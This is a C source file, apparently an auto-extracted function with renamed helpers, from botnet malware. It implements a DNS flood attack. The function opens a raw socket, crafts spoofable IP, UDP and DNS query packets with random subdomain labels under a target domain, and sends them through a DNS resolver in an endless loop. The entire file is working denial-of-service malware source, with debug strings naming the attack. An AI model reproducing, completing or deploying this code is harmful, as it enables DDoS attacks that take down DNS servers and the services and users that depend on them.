#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  int uint16_t ;
struct udphdr {int source; int dest; void* len; scalar_t__ check; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ check; void* daddr; int /*<<< orphan*/  saddr; int /*<<< orphan*/  protocol; void* frag_off; void* tot_len; } ;
struct dnshdr {int id; void* qdcount; void* opts; } ;
struct dns_question {void* qclass; void* qtype; } ;
struct TYPE_3__ {void* s_addr; } ;
struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; } ;
struct attack_target {TYPE_2__ sock_addr; } ;
struct attack_option {int dummy; } ;
typedef  int port_t ;
typedef  void* ipv4_t ;
typedef  void* BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ATK_OPT_DNS_HDR_ID ; 
 int /*<<< orphan*/  ATK_OPT_DOMAIN ; 
 int /*<<< orphan*/  ATK_OPT_DPORT ; 
 int /*<<< orphan*/  ATK_OPT_IP_DF ; 
 int /*<<< orphan*/  ATK_OPT_IP_IDENT ; 
 int /*<<< orphan*/  ATK_OPT_IP_TOS ; 
 int /*<<< orphan*/  ATK_OPT_IP_TTL ; 
 int /*<<< orphan*/  ATK_OPT_PAYLOAD_SIZE ; 
 int /*<<< orphan*/  ATK_OPT_SPORT ; 
 int FALSE ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  LOCAL_ADDR ; 
 int /*<<< orphan*/  MSG_NOSIGNAL ; 
 int PROTO_DNS_QCLASS_IP ; 
 int PROTO_DNS_QTYPE_A ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 scalar_t__ TRUE ; 
 void* FUNC0 (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
 char* FUNC1 (int,struct attack_option*,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 void* FUNC2 (int,int) ; 
 scalar_t__ FUNC3 (int*,int) ; 
 scalar_t__ FUNC4 (struct iphdr*,struct udphdr*,void*,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 scalar_t__ errno ; 
 void* FUNC6 () ; 
 void* FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (int*,int) ; 
 int FUNC10 () ; 
 int /*<<< orphan*/  FUNC11 (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int FUNC12 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,int) ; 
 int FUNC15 (char*) ; 

void FUNC16(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = FUNC2(targs_len, sizeof (char *));
    uint8_t ip_tos = FUNC0(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = FUNC0(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = FUNC0(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = FUNC0(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = FUNC0(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = FUNC0(opts_len, opts, ATK_OPT_DPORT, 53);
    uint16_t dns_hdr_id = FUNC0(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
    uint8_t data_len = FUNC0(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
    char *domain = FUNC1(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    int domain_len;
    ipv4_t dns_resolver = FUNC6();

    if (domain == NULL)
    {
#ifdef DEBUG
        printf("Cannot send DNS flood without a domain\n");
#endif
        return;
    }
    domain_len = FUNC15(domain);

    if ((fd = FUNC13(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (FUNC12(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        FUNC5(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        int ii;
        uint8_t curr_word_len = 0, num_words = 0;
        struct iphdr *iph;
        struct udphdr *udph;
        struct dnshdr *dnsh;
        char *qname, *curr_lbl;
        struct dns_question *dnst;

        pkts[i] = FUNC2(600, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        dnsh = (struct dnshdr *)(udph + 1);
        qname = (char *)(dnsh + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = FUNC7(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
        iph->id = FUNC7(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = FUNC7(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dns_resolver;

        udph->source = FUNC7(sport);
        udph->dest = FUNC7(dport);
        udph->len = FUNC7(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

        dnsh->id = FUNC7(dns_hdr_id);
        dnsh->opts = FUNC7(1 << 8); // Recursion desired
        dnsh->qdcount = FUNC7(1);

        // Fill out random area
        *qname++ = data_len;
        qname += data_len;

        curr_lbl = qname;
        FUNC14(qname + 1, domain, domain_len + 1); // Null byte at end needed

        // Write in domain
        for (ii = 0; ii < domain_len; ii++)
        {
            if (domain[ii] == '.')
            {
                *curr_lbl = curr_word_len;
                curr_word_len = 0;
                num_words++;
                curr_lbl = qname + ii + 1;
            }
            else
                curr_word_len++;
        }
        *curr_lbl = curr_word_len;

        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = FUNC7(PROTO_DNS_QTYPE_A);
        dnst->qclass = FUNC7(PROTO_DNS_QCLASS_IP);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
            char *qrand = ((char *)(dnsh + 1)) + 1;

            if (ip_ident == 0xffff)
                iph->id = FUNC10() & 0xffff;
            if (sport == 0xffff)
                udph->source = FUNC10() & 0xffff;
            if (dport == 0xffff)
                udph->dest = FUNC10() & 0xffff;

            if (dns_hdr_id == 0xffff)
                dnsh->id = FUNC10() & 0xffff;

            FUNC9((uint8_t *)qrand, data_len);

            iph->check = 0;
            iph->check = FUNC3((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = FUNC4(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;
            FUNC11(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}